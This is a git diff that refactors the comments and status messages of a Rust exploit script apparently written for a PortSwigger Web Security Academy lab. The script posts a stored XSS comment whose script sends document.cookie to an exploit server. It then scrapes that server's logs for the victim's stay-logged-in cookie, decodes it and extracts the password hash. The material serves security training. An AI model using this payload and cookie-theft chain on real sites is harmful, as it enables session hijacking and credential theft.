@@ -44,20 +44,34 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0a07001904dedc7b83692d2900f80018.web-security-academy.net"; // change this url to your lab
-    let exploit_server_url = "https://exploit-0af0009f0492dc0a83172cf1019f000a.exploit-server.net"; // change this url to your exploit server
-    let client = build_client(); // build the client which will be used in all subsequent requests
+    // change this to your lab URL
+    let url = "https://0a07001904dedc7b83692d2900f80018.web-security-academy.net";
 
-    let start_time = time::Instant::now(); // capture the time before enumeration
+    // change this url to your exploit server
+    let exploit_server_url = "https://exploit-0af0009f0492dc0a83172cf1019f000a.exploit-server.net";
 
-    let is_exloited = exploit_xss_in_comment_functionality(&client, url, exploit_server_url); // put an XSS payload in the comment
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // capture the time before enumeration
+    let start_time = time::Instant::now();
+
+    // put an XSS payload in a comment
+    let is_exloited = exploit_xss_in_comment_functionality(&client, url, exploit_server_url);
+
+    // if you injected XSS successfully
     if is_exloited {
-        // if you injected XSS successfully
-        let cookie = extract_cookie_from_logs(&client, exploit_server_url); // try to extract the cookie from the your server logs
+        // try to extract the cookie from the your server logs
+        let cookie = extract_cookie_from_logs(&client, exploit_server_url);
+
+        // if you found the cookie
         if let Some(encrypt) = cookie {
-            // if you found the cookie
-            let decrypted = decode_cookie(encrypt); // decrypt the cookie
-            let hash = decrypted.split(":").nth(1).unwrap(); // get the hash and exclude the name
+            // decrypt the cookie
+            let decrypted = decode_cookie(encrypt);
+
+            // get the hash and exclude the name
+            let hash = decrypted.split(":").nth(1).unwrap();
+
             println!(
                 "{}: {}",
                 "✅ Password hash".yellow().bold(),
@@ -95,7 +109,8 @@ fn exploit_xss_in_comment_functionality(
     url: &str,
     exploit_server_url: &str,
 ) -> bool {
-    let exploit_xss =   client.post(&format!("{url}/post/comment")).form(&HashMap::from(
+    // put the payload in a comment
+    let exploit_xss = client.post(&format!("{url}/post/comment")).form(&HashMap::from(
        [ ("postId", "2"),
         ("comment",
         &format!("<script>fetch('{exploit_server_url}/exploit?cookie=' + document.cookie)</script/> Exploited!")
@@ -104,10 +119,14 @@ fn exploit_xss_in_comment_functionality(
         ("email", "hacker@hacker.me"),
         ("website", "")]
     )).send();
+
+    // if the comment is added successfully
     if let Ok(res) = exploit_xss {
         println!(
             "{}",
-            "1. Exploit XSS in comment functionality.. ☑️".white().bold()
+            "1. Exploit XSS in comment functionality.. OK"
+                .white()
+                .bold()
         );
         true
     } else {
@@ -119,16 +138,24 @@ fn exploit_xss_in_comment_functionality(
 * Function used to extract the cookie from the exploit sever logs
 ******************************************************************/
 fn extract_cookie_from_logs(client: &Client, exploit_server_url: &str) -> Option<String> {
+    // define the pattern used in extracting the cookie
     let pattern = Regex::new("stay-logged-in=(.*) HTTP").unwrap();
+
+    // fetch the logs
     let logs = client.get(format!("{exploit_server_url}/log")).send();
+
+    // if fetching logs is successful
     if let Ok(res) = logs {
+        // try to extarct the cookie
         let body = res.text().unwrap();
         let cookie = pattern.captures(&body);
+        
+        // if extracting is OK
         if let Some(text) = cookie {
             let encrypt = text.get(1).unwrap().as_str().to_string();
             println!(
                 "{}",
-                "2. Get stay-logged-in cookie of the victim from exploit sever logs.. ☑️"
+                "2. Get stay-logged-in cookie of the victim from exploit sever logs.. OK"
                     .white()
                     .bold()
             );
@@ -146,7 +173,7 @@ fn extract_cookie_from_logs(client: &Client, exploit_server_url: &str) -> Option
 * Function used to decode the extracted cookie
 ***********************************************/
 fn decode_cookie(cookie: String) -> String {
-    println!("{}", "3. Decoding the encrypted cookie.. ☑️".white().bold());
+    println!("{}", "3. Decoding the encrypted cookie.. OK".white().bold());
     base64::engine::general_purpose::STANDARD_NO_PAD
         .decode(cookie)
         .unwrap()
